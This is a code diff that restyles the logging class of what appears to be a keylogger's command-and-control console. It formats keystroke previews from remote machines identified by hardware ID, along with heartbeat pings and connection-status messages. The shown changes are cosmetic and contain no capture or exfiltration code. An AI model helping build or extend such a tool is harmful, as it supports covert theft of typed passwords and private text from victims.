@@ -53,25 +53,41 @@ class Log:
     def keystroke(name, hwid, count, preview=""):
         """Dim/grey for routine keystroke data — low importance noise."""
         ts = datetime.datetime.now().strftime("%H:%M:%S")
+
         if preview:
             preview_clean = preview.replace('\n', '\\n')[:80]
-            msg = f"[{dim(ts)}] {C.GREY}{name}{C.RESET} ({C.DIM}{count} chars{C.RESET}) {C.DIM}{preview_clean}{C.RESET}"
+
+            print(
+                f"{C.DIM}[{ts}] "
+                f"{C.CYAN}Keylog:{C.RESET} "
+                f"{C.GREY}{name}{C.RESET} "
+                f"({C.DIM}{count} chars{C.RESET}) "
+                f"{C.DIM}{preview_clean}{C.RESET}"
+            )
         else:
-            msg = f"[{dim(ts)}] {C.GREY}{name}{C.RESET} ({C.DIM}{count} chars{C.RESET})"
-        print(msg)
+            print(
+                f"{C.DIM}[{ts}] "
+                f"{C.CYAN}Keylog:{C.RESET} "
+                f"{C.GREY}{name}{C.RESET} "
+                f"({C.DIM}{count} chars{C.RESET})"
+            )
 
     @staticmethod
     def heartbeat(name, hwid):
         """Very dim — pings clutter the screen, make them barely visible."""
         ts = datetime.datetime.now().strftime("%H:%M:%S")
-        print(f"{C.DIM}[{ts}] ♥ {name} ({hwid[:8]}...){C.RESET}")
+        print(
+        f"{C.DIM}[{ts}] "
+        f"{C.YELLOW}Alive ♥{C.RESET}"
+        f"{C.DIM} {name} ({hwid[:8]}...){C.RESET}"
+    )
 
     @staticmethod
     def status_change(name, hwid, alive):
         """Yellow for going dead, green for coming alive."""
         ts = datetime.datetime.now().strftime("%H:%M:%S")
         if alive:
-            cprint(f"[{ts}] ▲ {name} — ALIVE", color=C.GREEN)
+            cprint(f"[{ts}] ▲ {name} — Connected", color=C.GREEN)
         else:
             cprint(f"[{ts}] ▼ {name} — DEAD (no signal >{HEARTBEAT_TIMEOUT}s)", color=C.YELLOW)
 
